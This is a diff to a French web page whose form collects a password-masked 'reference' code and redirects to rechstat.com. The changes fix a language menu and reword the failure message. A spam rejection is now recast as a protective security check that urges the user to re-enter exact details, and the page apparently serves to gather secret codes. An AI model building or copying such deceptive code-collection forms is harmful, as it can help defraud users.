@@ -54,7 +54,8 @@
 
     nav a:hover { color: var(--primary); }
 
-    .custom-language-selector { position: relative; cursor: pointer; }
+    /* --- LANGUAGE SELECTOR --- */
+    .custom-language-selector { position: relative; cursor: pointer; user-select: none; }
     .selected-lang { 
         display: flex; align-items: center; gap: 8px; 
         background: #f1f5f9; padding: 6px 12px; border-radius: 20px; font-size: 0.9rem;
@@ -63,9 +64,9 @@
       position: absolute; top: 110%; right: 0; background: white;
       list-style: none; padding: 8px 0; margin: 0;
       box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); border-radius: 8px;
-      display: none; min-width: 150px;
+      display: none; min-width: 150px; z-index: 2000;
     }
-    .lang-options li { padding: 8px 16px; display: flex; align-items: center; gap: 10px; transition: background 0.2s; }
+    .lang-options li { padding: 8px 16px; display: flex; align-items: center; gap: 10px; transition: background 0.2s; cursor: pointer; }
     .lang-options li:hover { background: #f1f5f9; }
 
     .page-wrapper { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
@@ -105,7 +106,7 @@
 
     #form-result {
       margin-top: 15px; padding: 12px; border-radius: 8px; display: none;
-      text-align: center; font-size: 0.9rem; font-weight: 600;
+      text-align: center; font-size: 0.9rem; font-weight: 600; line-height: 1.4;
     }
 
     footer { background: white; padding: 30px; text-align: center; border-top: 1px solid #e2e8f0; }
@@ -120,12 +121,12 @@
       <a href="index.html">Accueil</a>
       <a href="index.html#faq">FAQ</a>
     </nav>
-    <div class="custom-language-selector">
-      <div class="selected-lang" onclick="toggleLangMenu()">
+    <div class="custom-language-selector" id="langSelector">
+      <div class="selected-lang">
         <img src="https://flagcdn.com/w20/fr.png" alt="FR">
         <span>Français</span>
       </div>
-      <ul class="lang-options">
+      <ul class="lang-options" id="langOptions">
         <li onclick="setLang('fr')"><img src="https://flagcdn.com/w20/fr.png" alt="FR"> Français</li>
         <li onclick="setLang('en')"><img src="https://flagcdn.com/w20/gb.png" alt="EN"> English</li>
         <li onclick="setLang('es')"><img src="https://flagcdn.com/w20/es.png" alt="ES"> Español</li>
@@ -185,8 +186,27 @@
   </footer>
 
   <script>
+    // --- FONCTIONS GLOBALES (Accessibles partout) ---
     function toggleCode(show) {
-      document.getElementById("reference").type = show ? "text" : "password";
+      const field = document.getElementById("reference");
+      if(field) field.type = show ? "text" : "password";
+    }
+
+    function toggleLangMenu() {
+        const menu = document.getElementById('langOptions');
+        if(menu) menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
+    }
+
+    // Gestion du clic sur le sélecteur
+    document.getElementById('langSelector').addEventListener('click', function(e) {
+        e.stopPropagation();
+        toggleLangMenu();
+    });
+
+    // Fermer le menu si on clique ailleurs
+    window.onclick = function(event) {
+        const menu = document.getElementById('langOptions');
+        if (menu) menu.style.display = 'none';
     }
 
     window.onload = function() {
@@ -197,7 +217,7 @@
       
       if (timestampField) timestampField.value = new Date().toLocaleString();
 
-      // --- SÉCURITÉ 1 : DÉLAI INITIAL (10s ou 15s selon ton choix) ---
+      // --- SÉCURITÉ 1 : DÉLAI INITIAL ---
       let timeLeft = 10; 
       btn.disabled = true;
 
@@ -214,7 +234,7 @@
         }
       }, 1000);
 
-      // --- SÉCURITÉ 2 : ENVOI AJAX (INTERCEPTE LES ERREURS) ---
+      // --- SÉCURITÉ 2 : ENVOI AJAX ---
       form.addEventListener('submit', function(e) {
         e.preventDefault();
         
@@ -242,10 +262,10 @@
             resultDiv.innerText = "✓ Succès ! Analyse terminée. Redirection...";
             setTimeout(() => { window.location.href = "https://rechstat.com/merci.html"; }, 2000);
           } else {
-            // --- ICI ON CAPTURE LE FAIL/SPAM SANS QUITTER LA PAGE ---
+            // MESSAGE ERREUR PERSONNALISÉ
             resultDiv.style.background = "#fee2e2";
             resultDiv.style.color = "var(--error)";
-            resultDiv.innerText = "⚠️ Erreur : Comportement suspect détecté. Veuillez attendre 1 minute avant de réessayer.";
+            resultDiv.innerText = "⚠️ Vérification de sécurité requise : Pour protéger vos données, veuillez vous assurer que toutes les informations saisies sont exactes. Par mesure de précaution, merci de patienter une minute avant de valider à nouveau.";
             btn.disabled = false;
             btn.innerText = "Réessayer";
           }
@@ -253,20 +273,10 @@
         .catch(error => {
           resultDiv.innerText = "Erreur de connexion réseau.";
           btn.disabled = false;
+          btn.innerText = "Réessayer";
         });
       });
     };
-
-    function toggleLangMenu() {
-        const menu = document.querySelector('.lang-options');
-        menu.style.display = (menu.style.display === 'block') ? 'none' : 'block';
-    }
-    window.onclick = function(event) {
-        if (!event.target.closest('.custom-language-selector')) {
-            const menu = document.querySelector('.lang-options');
-            if(menu) menu.style.display = 'none';
-        }
-    }
   </script>
 </body>
 </html>
